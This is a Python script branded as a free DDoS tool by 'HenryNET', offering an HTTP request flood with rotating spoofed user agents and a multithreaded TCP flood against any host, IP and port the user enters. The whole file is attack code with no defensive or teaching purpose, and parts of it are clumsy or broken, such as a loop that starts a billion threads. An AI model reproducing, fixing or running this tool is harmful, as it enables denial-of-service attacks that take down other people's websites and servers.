import threading
import asyncio
import httpx
import socket
import os
import time
import random

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print("""
                            (◣ _ ◢)
                    
                [!] DDOS - HTTP WORKER BY HENRYNET
                [#] DEV: HenryNET206 | 10/9/2024
                [&] CHANNEL: @Leak_scriptddos
                [!] IT'S FREE SO DON'T SELL IT
                         
                            [Methods]
                   [1] HTTP-SPAM | [2] TCP-FLOOD
""")

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.48',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
]

async def send_http_request(host, headers):
    async with httpx.AsyncClient() as client:
        try:
            response = await client.get(host, headers=headers)
            return response.status_code
        except httpx.RequestError as e:
            print(f"HTTP Request Error: {e}")
            return None

async def http_spam(host, duration):
    headers = {
        'User-Agent': random.choice(USER_AGENTS)
    }
    start_time = time.time()
    requests_sent = 0

    while time.time() - start_time < duration:
        status_code = await send_http_request(host, headers)
        requests_sent += 1
        rqs = requests_sent / (time.time() - start_time)
        status_message = '200' if status_code == 200 else '500' if status_code == 500 else 'Enternet Server Error'
        print_status('HTTP-SPAM', host, rqs, 1, status_message)
        await asyncio.sleep(0.0000000000001)

def print_status(method, target, rqs, pps, status_message):
    print(f"HenryNET | Method: {method} | Host: {target} | RQS: {rqs:.2f} | PPS: {pps} | STATUS: {status_message}")
    time.sleep(0.1)

def worker_tcp(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((ip, port))
            while True:
                sock.sendto(b'\x00' * 1024, (ip, port))
        except socket.error as e:
            print(f"TCP Flood failed")

def tcp_flood(ip, port, duration):
    start_time = time.time()
    threads = []
    requests_sent = 0

    while time.time() - start_time < duration:
        for _ in range(1000000000):
            thread = threading.Thread(target=worker_tcp, args=(ip, port))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()
        requests_sent += len(threads)
        print_status('TCP-FLOOD', ip, requests_sent, len(threads), '200')
        time.sleep(0.0000000000001)

def main():
    print_banner()
    choice = input("Enter Choose: ")

    if choice == '1':
        host = input("Enter Host: ")
        duration = float(input("Enter Time: "))
        asyncio.run(http_spam(host, duration))
    elif choice == '2':
        ip = input("Enter IP: ")
        port = int(input("Enter Port: "))
        duration = float(input("Enter Time: "))
        tcp_flood(ip, port, duration)
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()